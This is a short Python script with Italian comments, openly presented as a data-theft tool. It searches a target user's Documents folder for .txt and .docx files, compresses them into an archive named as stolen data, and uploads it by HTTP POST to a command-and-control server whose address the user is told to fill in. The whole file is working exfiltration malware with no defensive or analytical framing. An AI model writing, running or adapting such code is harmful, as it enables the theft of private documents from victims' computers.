import os
import requests
import zipfile

# Configura il server C2
C2_URL = "http://192.168.1.100/upload"  # Modifica con l'IP del tuo server C2

# Directory target per il furto di dati
TARGET_DIR = "C:\\Users\\Target\\Documents"

# Percorso temporaneo per salvare i file compressi
ZIP_FILE = "C:\\temp\\stolen_data.zip"

def find_files(directory, extensions):
    """Trova i file con estensioni specifiche."""
    files_to_steal = []
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(extensions):
                files_to_steal.append(os.path.join(root, file))
    return files_to_steal

def compress_files(files, output_path):
    """Comprimi i file in un archivio zip."""
    with zipfile.ZipFile(output_path, 'w') as zipf:
        for file in files:
            zipf.write(file, os.path.basename(file))

def send_to_c2(zip_file, url):
    """Invia i file compressi al server C2."""
    with open(zip_file, 'rb') as f:
        response = requests.post(url, files={"file": f})
    return response.status_code

if __name__ == "__main__":
    # Trova file sensibili
    files = find_files(TARGET_DIR, (".txt", ".docx"))
    print(f"Trovati {len(files)} file da rubare.")
    
    if files:
        # Comprimi i file
        compress_files(files, ZIP_FILE)
        print(f"File compressi in {ZIP_FILE}.")
        
        # Invia i file al server C2
        status = send_to_c2(ZIP_FILE, C2_URL)
        if status == 200:
            print("File inviati al server C2 con successo.")
        else:
            print(f"Errore durante l'invio: {status}")
